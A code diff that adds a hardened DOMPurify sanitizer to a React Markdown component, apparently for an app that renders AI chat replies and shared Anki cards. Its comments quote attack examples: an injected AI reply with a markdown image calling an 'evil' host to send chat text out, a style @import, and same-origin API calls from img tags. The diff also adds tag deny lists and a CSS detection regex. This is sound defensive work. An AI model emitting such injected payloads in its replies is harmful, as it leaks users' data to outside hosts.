@@ -15,10 +15,32 @@ DOMPurify.addHook('afterSanitizeAttributes', (node) => {
   }
 })
 
+// ONE sanitizer for every piece of HTML the app renders that it did not write itself (AI replies, cards
+// from shared Anki decks). DOMPurify's defaults keep <style> and form controls: a card back or an
+// injected chat reply carrying "<style>@import url(https://…)</style>" restyled the WHOLE app, could put
+// a full-window fake screen over it, and pull remote CSS that reads attribute values (the API key box).
+// Inline styles stay (Anki cards use them for colour) unless they load something or position an element
+// over the app.
+// Nothing here may LOAD a URL by itself either: an injected reply's "![](https://evil/?d=<chat text>)"
+// sent data out with no click, and "<img src=/api/...>" fired same-origin API calls (each spawning a
+// process) from inside the app. No reply or looked-up card needs media rendered, so media is dropped.
+// (Render-only: cards WRITTEN to Anki go through sanitizeCardHtml, which keeps their images.)
+const FORBID_TAGS = ['style', 'link', 'meta', 'base', 'form', 'input', 'textarea', 'select', 'button', 'option', 'iframe', 'frame', 'object', 'embed',
+  'img', 'picture', 'source', 'video', 'audio', 'track', 'image', 'use', 'feimage']
+const FORBID_ATTR = ['background', 'poster', 'srcset', 'ping', 'formaction', 'xlink:href']
+DOMPurify.addHook('uponSanitizeAttribute', (_node, data) => {
+  if (data.attrName !== 'style') return
+  const v = String(data.attrValue || '')
+  // Also refused: CSS escapes and comments (they disguise the rest: "position:/**/fixed", "\75rl(") and
+  // image-set(), which loads a URL given as a plain string, without url(.
+  if (/[\\]|\/\*/.test(v) || /url\s*\(|image-set|@import|expression\s*\(|position\s*:\s*(fixed|absolute|sticky)/i.test(v)) data.keepAttr = false
+})
+export const sanitizeHtml = (html, opts = {}) => DOMPurify.sanitize(String(html ?? ''), { ...opts, FORBID_TAGS, FORBID_ATTR })
+
 export default function Markdown({ text, style }) {
   const html = useMemo(() => {
     const raw = marked.parse(String(text || ''), { async: false })
-    const clean = DOMPurify.sanitize(raw, { ADD_ATTR: ['target', 'rel'] })
+    const clean = sanitizeHtml(raw, { ADD_ATTR: ['target', 'rel'] })
     return clean
   }, [text])
 
